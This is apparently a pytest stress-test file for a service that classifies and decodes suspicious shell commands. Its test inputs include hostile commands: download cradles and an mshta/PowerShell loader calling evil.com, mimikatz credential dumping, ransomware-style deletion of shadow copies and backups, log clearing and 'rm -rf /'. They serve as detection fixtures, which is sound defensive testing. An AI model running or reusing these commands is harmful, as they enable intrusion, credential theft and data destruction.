"""Stress / adversarial tests for the full analysis pipeline.

Throws real-world adversarial inputs, edge cases, and boundary conditions at
the classifier, decoder, parser, and LOLBAS matcher.  Every test must not
crash (no unhandled exception, always 200 or an expected error code).

Run:
    pytest tests/test_stress.py -v
"""

from __future__ import annotations

import base64
import gzip
import re
import string

import pytest

from app.classifier import classify
from app.decoder import decode_layers
from app.parser import extract_binaries
from app.redactor import redact
from app.slug import make_slug, normalize


# ── helpers ──────────────────────────────────────────────────────────────────

async def analyze(client, command: str, **extra) -> dict:
    resp = await client.post("/analyze", json={"command": command, **extra})
    return resp


# ── 1. Decoder edge cases ────────────────────────────────────────────────────

class TestDecoderEdgeCases:

    def test_empty_command(self):
        assert decode_layers("") == []

    def test_whitespace_only(self):
        assert decode_layers("   \t\n  ") == []

    def test_single_char(self):
        assert decode_layers("a") == []

    def test_valid_base64_garbage_bytes(self):
        # Valid base64 but decodes to binary garbage — no layers emitted
        raw = bytes(range(256))
        b64 = base64.b64encode(raw).decode()
        layers = decode_layers(f"powershell -enc {b64}")
        # Should not crash; any layer that appears must have a value
        for layer in layers:
            assert isinstance(layer["value"], str)

    def test_truncated_base64(self):
        # Odd-length base64 — should not crash
        layers = decode_layers("powershell -enc AAAA===INVALID")
        assert isinstance(layers, list)

    def test_null_bytes_in_command(self):
        cmd = "whoami\x00 && calc.exe"
        layers = decode_layers(cmd)
        assert isinstance(layers, list)

    def test_max_nesting_stops_cleanly(self):
        # 7 layers deep — must hit limit-reached, not recurse forever
        text = base64.b64encode(b"Get-Process").decode()
        for _ in range(7):
            text = "powershell -enc " + base64.b64encode(text.encode()).decode()
        layers = decode_layers(text)
        assert any(l["encoding"] == "limit-reached" for l in layers)

    def test_unicode_command(self):
        cmd = "echo '日本語テスト' && whoami"
        layers = decode_layers(cmd)
        assert isinstance(layers, list)

    def test_very_long_command(self):
        cmd = "A" * 65000
        layers = decode_layers(cmd)
        assert isinstance(layers, list)

    def test_base64_of_base64_different_values(self):
        inner = base64.b64encode(b"inner payload with enough length to extract").decode()
        outer = base64.b64encode(f"powershell -enc {inner}".encode()).decode()
        cmd = f"powershell -enc {outer}"
        layers = decode_layers(cmd)
        assert len(layers) >= 1

    def test_url_encoded_with_hex_mixed(self):
        # Both URL and hex-escape in same command — should not crash
        cmd = r"%63%6d%64 /c \x77\x68\x6f\x61\x6d\x69"
        layers = decode_layers(cmd)
        assert isinstance(layers, list)

    def test_env_var_no_infinite_loop(self):
        # $env: that resolves to something containing $env: should not loop
        cmd = r"$env:SystemRoot\System32\$env:ComSpec"
        layers = decode_layers(cmd)
        assert isinstance(layers, list)

    def test_frombase64string_no_quotes(self):
        # Pattern without quotes should NOT extract
        payload = base64.b64encode(b"whoami test payload here for length").decode()
        cmd = f"[Convert]::FromBase64String({payload})"
        layers = decode_layers(cmd)
        # May or may not match via standalone blob — just must not crash
        assert isinstance(layers, list)

    def test_char_concat_huge_sequence(self):
        # 200 [char] calls — must not crash or take > 1 second
        chars = "+".join(f"[char]{ord(c)}" for c in ("powershell " * 20).strip())
        layers = decode_layers(chars)
        assert isinstance(layers, list)

    def test_hex_string_not_printable(self):
        # Hex that decodes to non-printable bytes — should not emit a layer
        payload = "0102030405060708090a0b0c0d0e0f101112131415161718191a"
        layers = decode_layers(f"certutil {payload}")
        hex_layers = [l for l in layers if l.get("encoding") == "hex-string"]
        assert len(hex_layers) == 0

    def test_multiple_env_vars_in_one_command(self):
        cmd = r"$env:SystemRoot\System32\$env:COMPUTERNAME.exe && $env:TEMP\stage.exe"
        layers = decode_layers(cmd)
        env_layers = [l for l in layers if l["encoding"] == "env-variable-substitution"]
        assert len(env_layers) == 1  # only one resolved layer emitted

    def test_encoding_seen_dedup(self):
        # Same base64 blob appears twice — should not produce two identical layers
        b64 = base64.b64encode(b"Invoke-Expression download cradle payload here now").decode()
        cmd = f"powershell -enc {b64} -enc {b64}"
        layers = decode_layers(cmd)
        values = [l["value"] for l in layers]
        assert len(values) == len(set(values))


# ── 2. Classifier edge cases ─────────────────────────────────────────────────

class TestClassifierEdgeCases:

    def _names(self, result) -> set[str]:
        return {tc.name for tc in result}

    def test_empty_string(self):
        result = classify("", [])
        assert isinstance(result, list)

    def test_whitespace_only(self):
        result = classify("   ", [])
        assert isinstance(result, list)

    def test_benign_ls(self):
        result = classify("ls -la /tmp", [])
        # Should produce no or only low-confidence signals
        high = [tc for tc in result if tc.confidence == "high"]
        assert len(high) == 0

    def test_all_threat_classes_representable(self):
        # A kitchen-sink command that touches all classes
        kitchen_sink = (
            "mshta http://evil.com/payload.hta && "
            "regsvr32 /s C:\\Temp\\payload.dll && "
            "mimikatz sekurlsa::logonpasswords && "
            "net user hacker /add && "
            "schtasks /create /tn update /tr cmd.exe /sc onlogon && "
            "vssadmin delete shadows /all /quiet && "
            "wevtutil cl System && "
            "nltest /domain_trusts && "
            "7z a -tzip archive.zip C:\\Users"
        )
        result = classify(kitchen_sink, [])
        found = self._names(result)
        # Should fire many classes without crashing
        assert len(found) >= 4

    def test_no_false_positive_dir_listing(self):
        result = classify("dir C:\\Windows\\System32", [])
        dangerous = [tc for tc in result if tc.confidence in ("high", "medium")]
        assert len(dangerous) == 0

    def test_no_false_positive_ping(self):
        result = classify("ping -c 4 8.8.8.8", [])
        high = [tc for tc in result if tc.confidence == "high"]
        assert len(high) == 0

    def test_defanged_url_detected(self):
        result = classify("certutil -urlcache -f hxxp://evil[.]com/p out.exe", [])
        names = self._names(result)
        assert "dropper" in names

    def test_signals_are_strings(self):
        result = classify("powershell -enc JABhAD0A", [])
        for tc in result:
            for signal in tc.signals:
                assert isinstance(signal, str), f"Signal is not a string: {signal!r}"

    def test_techniques_have_id(self):
        result = classify("mshta javascript:new ActiveXObject('WScript.Shell').Run('cmd')", [])
        for tc in result:
            for t in tc.techniques:
                assert "id" in t
                assert re.match(r"T\d{4}(\.\d{3})?", t["id"]), f"Bad technique ID: {t['id']}"

    def test_very_long_command_no_crash(self):
        cmd = ("powershell -enc " + "A" * 60000)
        result = classify(cmd, [])
        assert isinstance(result, list)

    def test_null_bytes_no_crash(self):
        result = classify("whoami\x00 && calc", [])
        assert isinstance(result, list)

    def test_mixed_case_lolbas(self):
        result = classify("MSHTA.EXE javascript:close()", [])
        names = self._names(result)
        assert "loader" in names or "dropper" in names

    def test_unicode_no_crash(self):
        result = classify("echo 'тест' && whoami", [])
        assert isinstance(result, list)

    def test_decoded_layers_used(self):
        # Classifier receives decoded layers; signals from decoded content should fire
        layers = [{"layer": 1, "encoding": "base64-utf16le",
                   "value": "Invoke-Expression((New-Object Net.WebClient).DownloadString('http://evil.com/p'))"}]
        result = classify("powershell -enc JABhAD0A", layers)
        names = self._names(result)
        assert "dropper" in names or "loader" in names

    def test_confidence_values_valid(self):
        result = classify("certutil -urlcache -f http://evil.com/p out.exe", [])
        for tc in result:
            assert tc.confidence in ("high", "medium", "low")

    def test_no_duplicate_classes(self):
        result = classify("mimikatz sekurlsa::logonpasswords exit", [])
        names = [tc.name for tc in result]
        assert len(names) == len(set(names)), "Duplicate threat class in result"


# ── 3. Parser edge cases ─────────────────────────────────────────────────────

class TestParserEdgeCases:

    def test_empty_string(self):
        assert extract_binaries("") == []

    def test_quoted_path(self):
        bins = extract_binaries('"C:\\Program Files\\tool.exe" --flag')
        assert "tool.exe" in bins

    def test_extensionless_wbadmin(self):
        bins = extract_binaries("wbadmin delete catalog -quiet")
        assert "wbadmin.exe" in bins

    def test_extensionless_bcdedit(self):
        bins = extract_binaries("bcdedit /set {default} recoveryenabled No")
        assert "bcdedit.exe" in bins

    def test_chained_cmd(self):
        bins = extract_binaries("cmd.exe /c vssadmin.exe delete shadows /all & wbadmin delete catalog")
        assert "cmd.exe" in bins
        assert "vssadmin.exe" in bins
        assert "wbadmin.exe" in bins

    def test_no_duplicate_binaries(self):
        bins = extract_binaries("bcdedit /set {default} boot & bcdedit /set {default} recover")
        assert bins.count("bcdedit.exe") == 1

    def test_powershell_no_extension(self):
        bins = extract_binaries("powershell -enc AAAA")
        assert "powershell.exe" in bins

    def test_ps1_extension(self):
        bins = extract_binaries("powershell.exe -File C:\\temp\\payload.ps1")
        assert "powershell.exe" in bins

    def test_long_path(self):
        bins = extract_binaries("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -enc AAAA")
        assert "powershell.exe" in bins

    def test_arg_looks_like_binary(self):
        # /c is not a binary — should not be extracted as one
        bins = extract_binaries("cmd.exe /c whoami")
        assert "c.exe" not in bins

    def test_no_extension_non_system_binary(self):
        # "deploy" is not in the extensionless whitelist
        bins = extract_binaries("deploy --verbose")
        # Should still get SOMETHING (fallback) but should not crash
        assert isinstance(bins, list)


# ── 4. Redactor edge cases ───────────────────────────────────────────────────

class TestRedactorEdgeCases:

    def test_no_redaction_needed(self):
        cmd, changed = redact("whoami /all")
        assert cmd == "whoami /all"
        assert changed is False

    def test_private_ip_redacted(self):
        cmd, changed = redact("ping 192.168.1.100")
        assert "192.168.1.100" not in cmd
        assert changed is True

    def test_ntlm_hash_redacted(self):
        cmd, changed = redact("mimikatz sekurlsa::pth /ntlm:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0")
        assert "aad3b435b51404ee" not in cmd
        assert changed is True

    def test_password_flag_redacted(self):
        cmd, changed = redact("net use Z: \\\\server\\share password=hunter2 /user:admin")
        assert "hunter2" not in cmd
        assert changed is True

    def test_base64_not_redacted(self):
        b64 = base64.b64encode(b"payload").decode()
        cmd, changed = redact(f"powershell -enc {b64}")
        assert b64 in cmd  # base64 payload preserved

    def test_multiple_private_ips(self):
        cmd, changed = redact("route add 10.0.0.0 mask 255.0.0.0 172.16.0.1 via 192.168.1.1")
        assert "10.0.0.0" not in cmd
        assert "172.16.0.1" not in cmd
        assert "192.168.1.1" not in cmd

    def test_public_ip_not_redacted(self):
        cmd, changed = redact("ping 8.8.8.8")
        assert "8.8.8.8" in cmd
        assert changed is False

    def test_empty_command(self):
        cmd, changed = redact("")
        assert cmd == ""
        assert changed is False


# ── 5. Slug edge cases ───────────────────────────────────────────────────────

class TestSlugEdgeCases:

    def test_same_command_same_slug(self):
        assert make_slug("whoami /all") == make_slug("whoami /all")

    def test_whitespace_normalization(self):
        assert make_slug("whoami  /all") == make_slug("whoami /all")
        assert make_slug("  whoami /all  ") == make_slug("whoami /all")
        assert make_slug("whoami\t/all") == make_slug("whoami /all")

    def test_slug_format(self):
        slug = make_slug("test")
        assert len(slug) == 12
        assert re.match(r"^[A-Z2-7]{12}$", slug)

    def test_different_commands_different_slugs(self):
        assert make_slug("whoami") != make_slug("whoami /all")

    def test_normalize_empty(self):
        assert normalize("") == ""

    def test_normalize_tabs_newlines(self):
        assert normalize("a\tb\nc") == "a b c"

    def test_very_long_command_slug(self):
        slug = make_slug("A" * 65000)
        assert len(slug) == 12


# ── 6. API endpoint stress ───────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_api_max_length_command(client):
    resp = await analyze(client, "A" * 65536)
    assert resp.status_code == 200


@pytest.mark.asyncio
async def test_api_over_max_length(client):
    resp = await analyze(client, "A" * 65537)
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_api_special_chars_in_command(client):
    cmd = "echo '<script>alert(1)</script>' && ls; rm -rf /"
    resp = await analyze(client, cmd)
    assert resp.status_code == 200


@pytest.mark.asyncio
async def test_api_unicode_command(client):
    resp = await analyze(client, "echo '日本語テスト'")
    assert resp.status_code == 200


@pytest.mark.asyncio
async def test_api_null_byte_in_command(client):
    resp = await analyze(client, "whoami\x00evil")
    assert resp.status_code == 200


@pytest.mark.asyncio
async def test_api_result_has_required_fields(client):
    resp = await analyze(client, "whoami")
    assert resp.status_code == 200
    data = resp.json()
    for field in ("slug", "threat_classes", "decoded_layers", "binaries_in_command"):
        assert field in data, f"Missing field: {field}"


@pytest.mark.asyncio
async def test_api_slug_deterministic(client):
    r1 = await analyze(client, "whoami")
    r2 = await analyze(client, "whoami")
    assert r1.json()["slug"] == r2.json()["slug"]


@pytest.mark.asyncio
async def test_api_slug_whitespace_normalization(client):
    r1 = await analyze(client, "whoami  /all")
    r2 = await analyze(client, "whoami /all")
    assert r1.json()["slug"] == r2.json()["slug"]


@pytest.mark.asyncio
async def test_api_all_printable_ascii(client):
    # Every printable ASCII char in a command — should not crash
    cmd = string.printable
    resp = await analyze(client, cmd)
    assert resp.status_code == 200


@pytest.mark.asyncio
async def test_api_real_world_lockbit(client):
    cmd = "cmd.exe /c vssadmin delete shadows /all /quiet & bcdedit /set {default} recoveryenabled No & wbadmin delete catalog -quiet"
    resp = await analyze(client, cmd)
    assert resp.status_code == 200
    data = resp.json()
    threat_names = [tc["name"] for tc in data["threat_classes"]]
    assert "impact" in threat_names


@pytest.mark.asyncio
async def test_api_real_world_clickfix(client):
    cmd = 'mshta "javascript:close();var r=new ActiveXObject(\'WScript.Shell\');r.Run(\'powershell -ep bypass -w hidden -c IEX((New-Object Net.WebClient).DownloadString(\\\'http://evil.com/p\\\'))\',0,true);"'
    resp = await analyze(client, cmd)
    assert resp.status_code == 200
    data = resp.json()
    threat_names = [tc["name"] for tc in data["threat_classes"]]
    assert "dropper" in threat_names or "loader" in threat_names


@pytest.mark.asyncio
async def test_api_private_without_auth_returns_401(client):
    resp = await analyze(client, "whoami", is_private=True)
    assert resp.status_code == 401


@pytest.mark.asyncio
async def test_api_missing_command_returns_422(client):
    resp = await client.post("/analyze", json={})
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_api_lolbas_match_structure(client):
    # mshta.exe is in LOLBAS — verify returned structure is valid
    cmd = "mshta.exe javascript:close()"
    resp = await analyze(client, cmd)
    assert resp.status_code == 200
    data = resp.json()
    for b in data.get("binaries_in_command", []):
        assert "name" in b
        assert "source" in b
        assert b["source"] in ("lolbas", "gtfobins", "system", "unknown")
        assert isinstance(b.get("techniques", []), list)
        assert isinstance(b.get("functions", []), list)
